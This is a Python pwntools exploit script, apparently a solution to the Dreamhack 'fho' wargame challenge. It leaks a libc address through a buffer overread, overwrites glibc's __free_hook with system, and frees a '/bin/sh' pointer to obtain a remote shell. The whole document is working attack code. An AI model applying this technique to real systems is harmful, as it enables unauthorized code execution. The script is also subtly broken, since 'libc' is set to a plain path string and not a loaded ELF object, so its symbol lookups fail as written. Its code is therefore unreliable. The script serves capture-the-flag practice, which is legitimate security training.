from pwn import *

p = remote("host3.dreamhack.games", 22403)
e = ELF('./fho')
libc = ('./libc-2.27.so')

def slog(name, addr): return success(": ".join([name, hex(addr)]))

#[1] Leak libc_base
buf = b'A' * 0x48
p.sendafter('Buf: ', buf)
p.recvuntil(buf)
libc_start_main_xx = u64(p.recvline()[:-1] + b'\x00'*2)
libc_base = libc_start_main_xx - (libc.symbols['__libc_start_main'] + 231)
# or libc_base = libc_start_main_xx - libc.libc_start_main_return

system = libc_base + libc.symbols['system']

free_hook = libc_base + libc.symbols['__free_hook']
binsh = libc_base + next(libc.search(b'/bin/sh'))

slog('libc_base', libc_base)
slog('system', system)
slog('free_hook', free_hook)
slog('/bin/sh', binsh)

#[2] Overwirte 'free hook' with 'system'
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(system).encode())


#[3] Exploit
p.recvuntil('To free: ')
p.sendline(str(binsh).encode())

p.interactive()
